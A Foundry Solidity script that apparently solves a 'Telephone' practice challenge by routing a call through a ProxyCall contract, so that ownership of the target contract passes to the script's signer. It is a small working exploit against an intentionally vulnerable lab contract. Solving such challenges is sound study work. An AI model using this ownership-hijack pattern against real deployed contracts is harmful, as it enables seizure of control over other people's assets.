// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";

import {ProxyCall} from "../src/telephone/ProxyCall.sol";
import {Telephone} from "../src/telephone/Telephone.sol";

contract ProxyCallScript is Script {
    ProxyCall public proxy;
    Telephone public telephone;

    function setUp() public {
        proxy = ProxyCall(0xf0666be60F7466bEd985dDC8BeA9d3244948455a);
        telephone = Telephone(0x28C32A4D63524c806b125EC3615aBdDC2B3536DE);
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address newOwner = vm.addr(deployerPrivateKey);
        proxy.forward(telephone);

        require(telephone.owner() == newOwner, "failed to change owner");
    }
}
